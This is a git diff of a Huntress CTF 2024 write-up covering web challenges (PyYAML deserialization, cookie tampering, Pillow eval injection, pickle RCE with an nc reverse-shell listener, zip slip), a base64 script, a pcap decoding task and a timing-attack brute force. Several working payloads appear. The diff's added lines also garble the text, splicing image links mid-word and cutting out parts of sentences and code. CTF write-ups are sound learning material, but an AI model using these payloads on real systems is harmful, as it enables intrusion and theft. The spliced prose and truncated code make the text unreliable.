@@ -1,6 +1,22 @@
+---
+date: 2024-11-03
+description: 
+platform: Huntress CTF 2024
+categories: Web, Scripting, Misc
+tags:
+  - CVE-2020-14343
+  - CVE-2022-22817
+  - insecure-deserialization
+  - command-injection
+  - SQLi
+  - file-upload-attacks
+  - timing-attack
+  - python
+  - cryptographic-failures
+duration:
+---
 # Huntress CTF 2024 Writeups
 Writeups for all web (6/6) and scripting (2/2) challenges. + misc/time-will-tell
-
 
 ---
 
@@ -16,9 +32,7 @@ This writeup https://hackmd.io/@harrier/uiuctf20 explains and builds upon the pa
 ```yaml
 !!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "open('/flag.txt','r').read()" ]]]
 ```
-![alt text](images/y2j-flag.png)
-## Plantopia (131 pts)
-We given a web application with credentials to the login page. Logging in we can observe that `session` and `auth` cookies are set as well as other cookies.
+![alt text](y2j-flag.png)pplication with credentials to the login page. Logging in we can observe that `session` and `auth` cookies are set as well as other cookies.
 
 ```
 Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.ZyaENQ.GHM7nJw9Sk3doUEeOrRuWj4JibI; auth=dGVzdHVzZXIuMC4xNzMwNTgzODIw
@@ -26,14 +40,14 @@ Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.ZyaENQ.GHM7nJw9Sk3doUEeOrRuWj4JibI; auth=
 
 We can also see there is API documentation but some looks like its for admin.
 
-![alt text](images/plantopiaa.png)
+![alt text](_attachments/plantopiaa.png)
 
 
-Accessing these endpoints require us to use an `Authorization` header using the `auth` cookie set during our login. We can set `Authorization: dGVzdHVzZXIuMC4xNzMwNTgzODIw` to access the API. which is just base64 encoded from `testuser.0.1730583820`
+Acc![alt text](plantopiaa.png)he `auth` cookie set during our login. We can set `Authorization: dGVzdHVzZXIuMC4xNzMwNTgzODIw` to access the API. which is just base64 encoded from `testuser.0.1730583820`
 
 Since most of these functionality require admin privileges. I played around and just changed the value from `testuser` to `admin` and from `0` to `1`. and I successfully accessed the `/api/admin/logs`
 
-![alt text](images/logs.png)
+![alt text](_attachments/logs.png)
 
 From there its just playing around with the admin functionalities. We can see that we can change the commands in the `/api/plants/1/edit`
 
@@ -56,18 +70,17 @@ Content-Type: application/json
 
 Then we can trigger it via `/api/admin/sendmail` then view the output in `/api/admin/logs`
 
-![alt text](images/plantopia-flag.png)
+![alt text](_attachments/plantopia-flag.png)
 
 ## HelpfulDesk (231 pts)
-Not going deep into this one. This is duplicate from NahamconCTF
-https://www.google.com/search?q=nahamconctf+helpfuldesk+writeup
+Not goin![alt text](plantopia-flag.png)m/search?q=nahamconctf+helpfuldesk+writeup
 
 There is a `/Setup/SetupWizard` path if you download and view the source code where you can change the admin credentials and from there we can get the flag. 
 
 ## PillowFight (338 pts)
-"PillowFight uses advanced AI/MLRegressionLearning* to combine two images of your choosing" 
+"PillowFight uses advanced AI/MLRegressionLearning* to combine two _attachments of your choosing" 
 
-Trying out the web application feature we can upload 2 images and combine into `/static/combined.png`. We can also see that this is `Powered by Python Pillow v8.4.0!` as seen from the footer. 
+Trying out the web application feature we can upload 2 _attachments and combine into `/static/combined.png`. We can also see that this is `Powered by Python Pillow v8.4.0!` as seen from the footer. 
 
 > Searching around, I learned it might be vulnerable to 
 > https://nvd.nist.gov/vuln/detail/CVE-2022-22817 
@@ -75,23 +88,21 @@ Trying out the web application feature we can upload 2 images and combine into `
 
 We can see that we can also add custom commands from the API documentation
 
-![alt text](images/pillow-fight-api.png)
+![alt text](_attachments/pillow-fight-api.png)
 
 
-This looks like we can pass our own `eval` command, so I tried working with python code injection payloads and ended up using a standard os command payload to get the flag and write to the `/static` directory. 
+This looks like we can pass our own `eval` command, so I tried workin![alt text](pillow-fight-api.png)ayload to get the flag and write to the `/static` directory. 
 
 ```python
 exec('import os; os.system("cat flag.txt> ./static/flag.txt")') 
 ```
 
 
-![alt text](images/pillow-flag.png)
+![alt text](_attachments/pillow-flag.png)
 
 ## MOVEable (376 pts)
 
-We can see in the web application a standard login form, no registration. Aside from that we have the source code.
-
-What I observed first in the source code is the `executeScript` under `/login` route.
+We can see in the web application a standard login form, no registration. Aside from that we![alt text](pillow-flag.png)ecuteScript` under `/login` route.
 
 ```python
 @app.route('/login', methods=['POST'])
@@ -212,17 +223,17 @@ Setup a listener `nc -nvlp <port>`
 
 To trigger this pickle RCE we just have to navigate to `/download/pickle.rce/1337`. this depends on the inserted values on the database. Check the listener and well get the shell and find the flag under root. 
 
-![alt text](images/movable-flag.png)
+![alt text](_attachments/movable-flag.png)
 
 
 ## Zippy (392 pts)
 The web applications main functionality is the upload and extraction of ZIP files contents.
 
-![alt text](images/zippy-web.png)
-We can upload zip files in the `/Upload` and browse directories and filenames under `/Browse`.  
+![alt text](_attachments/zippy-web.png)
+We can ![alt text](movable-flag.png) `/Browse`.  
 Additionally we can observe the backend is asp.net Razor pages when we check the `/Logs`
 
-> I searched for File upload attacks regarding zip files and found the **zip slip vulnerability** and found a guide online https://infosecwriteups.com/zip-slip-vulnerability-064d46ca42e5
+> I searche![alt text](zippy-web.png)lnerability** and found a guide online https://infosecwriteups.com/zip-slip-vulnerability-064d46ca42e5
 
 
 I used this vulnerability to change the code of the `Browse.cshtml` Razor page that allowed me to view the contents of files in the server. 
@@ -263,7 +274,7 @@ zip browse.zip ../../../Pages/Browse.cshtml
 
 
 
-![alt text](images/zippy-flagg.png)
+![alt text](_attachments/zippy-flagg.png)
 
 --- 
 
@@ -275,11 +286,7 @@ We are given a text file in base64, if we decode the output is still base64. Cre
 import base64 
 
 b64 = ""
-with open('base64by32','r') as file:
-    b64 = file.read()
-
-while True:
-    try:
+with ![alt text](zippy-flagg.png)
         b64 = base64.b64decode(b64).decode().strip('\n')
         print(b64)
     except Exception as e:
@@ -292,17 +299,14 @@ print(b64)
 ## Echo Chamber (50 pts)
 We are given pcap file. If we open it in wireshark and observe the request/responses we can see some repetitive bytes at the end of the packets.  
 
-![alt text](images/pcap.png)
+![alt text](_attachments/pcap.png)
 First packet shows a repetitive `89` bytes at the end. Succeeding packets shows `89 50 4E` indicating that there might be a PNG file being sent. 
 
 quick reference for magic numbers:
 https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5
 
 
-The packets on last bytes when combined will look like this forming the flag.
-![alt text](images/packets.png)
-
-To solve we this, we can create a python script parsing the last few bytes and write it to a `PNG` file. I utilized https://github.com/KimiNewt/pyshark 
+The packets on last bytes when combined will![alt text](pcap.png)o solve we this, we can create a python script parsing the last few bytes and write it to a `PNG` file. I utilized https://github.com/KimiNewt/pyshark 
 
 ```python
 import pyshark
@@ -313,11 +317,7 @@ cap = pyshark.FileCapture(file)
 hexdump = []
 for i, pkt in enumerate(cap):
     if i % 2:
-        # get the last byte
-        c = pkt["icmp"].data[-2:]
-        hexdump.append(c)
-    
-hexdump = "".join(hexdump)
+        # get the last![alt text](packets.png)hexdump = "".join(hexdump)
 print(hexdump)
 
 # write to png
@@ -373,35 +373,27 @@ print("Guess: ",guess , recv)
 
 ```
 
-![alt text](images/guess.png)
+![alt text](_attachments/guess.png)
 
 Since we have a 90 second window to guess, we can run a brute-force by looping through every hex character and observe the response delay using this flow.
 
-![alt text](images/initial-loop.png)
+![alt text](_attachments/initial-loop.png)
 
 So if the observed response increased from the previous ones we find the first character. We append the character to the current guess and continue the loop 
 
-> Continue this until we find the correct password 
-
-![alt text](images/final-loop.png)
+> Contin![alt text](guess.png)-loop.png)
 
 We can add this logic to the initial script to brute-force. The brute-force logic would look something like this:
 ```python
 password = ""
-max_time = 0.35
-
-print("Bruteforcing...")
-for _ in range(8):
-    for c in "0123456789abcdef":
+max_time![alt text](initial-loop.png)9abcdef":
         # guess placeholder 
         guess = (password+c).ljust(8,"_")
 
         # time the response
         before = time.time()
         p.sendlineafter(b':', bytes(guess.encode()))
-        recv = p.recvline()
-        after = time.time()        
-        print(guess, ":", recv, after-before)
+        recv = p.recvl![alt text](final-loop.png)after-before)
 
         # check if response exceeds the usual time
         if after-before > max_time: 
@@ -417,7 +409,8 @@ p.close()
 > Note that for max_time varies on the average connection response. during my tries it looks like the incorrect response would take `0.29` seconds and `0.39` seconds if it is correct. so i set the `max_time` to `0.35` initially. It is also important to increase `max_time` as it would increase the delay the more correct characters we have.
 
 When we run the script and we can see it started guessing initial character as `3` as the response time increased to `0.38+secs` 
-![alt text](images/output-time.png)
+![alt text](_attachments/output-time.png)
 
 After a while we can see the script works and we find the correct password `38aacb77` and get the flag.
-![alt text](images/output-flag.png)
+![alt text](_attachments/output-flag.png)
+![alt text](output-flag.png)![alt text](output-time.png)
